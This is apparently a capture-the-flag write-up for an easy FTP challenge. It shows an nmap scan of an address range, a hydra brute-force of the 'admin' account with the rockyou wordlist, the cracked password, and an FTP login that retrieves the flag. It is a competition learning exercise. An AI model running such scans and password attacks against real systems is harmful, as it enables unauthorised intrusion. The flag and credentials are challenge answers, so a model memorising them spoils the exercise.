# Flag Transfer Protocol

Proposed difficulty: `Very easy`

52 solves

```text
Er der mon en "admin" der har en port åben for at overføre filer? Og har han mon tænkt over at John lurer i skyggerne?
```

Has remote

## Solution

I first started scanning the network for any network devices with port 21 open.

I specifically search for port 21 as it is the FTP port. The name of the challenge suggests that this is the target service.

```bash
$ nmap 77.143.64.0/24 -sV -p 21 --open
Starting Nmap 7.94 ( https://nmap.org ) at 2024-03-19 19:11 CET
Nmap scan report for 48.64.143.77.rev.sfr.net (77.143.64.48)
Host is up (0.010s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     pyftpdlib 1.5.9

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 256 IP addresses (5 hosts up) scanned in 2.88 seconds
```

Here we see that the host `77.143.64.48` has port 21 open.

After a bit of looking around, i noticed that the anonymous user was not available, so the next step is to try to bruteforce credentials.

I did this by trying with username `admin` as hinted to in the description and using rockyou.txt for a wordlist attack. For this i will use `hydra`.

`hydra -l admin -P [...]/rockyou.txt ftp://77.143.64.48`

I left this running in the background while looking at other challenges.

After a while I got the following output from hydra:

```text
[21][ftp] host: 77.143.64.48   login: admin   password: phantom
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-03-19 19:20:18
```

We can now use the username and password combination (`admin`:`phantom`) to log into the ftp server.

```sh
$ ftp 77.143.64.48 -n
Connected to 77.143.64.48.
220 pyftpdlib 1.5.9 ready.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> user
(username) admin
331 Username ok, send password.
Password: 
230 Login successful.
ftp> get flag.txt
200 Active data connection established.
125 Data connection already open. Transfer starting.
226 Transfer complete.
34 bytes received in 0,000148 seconds (224 kbytes/s)
ftp>
221 Goodbye.
$ cat flag.txt            
DDC{Keeping-track-of-all-my-flags}
```

# Flag

`DDC{Keeping-track-of-all-my-flags}`
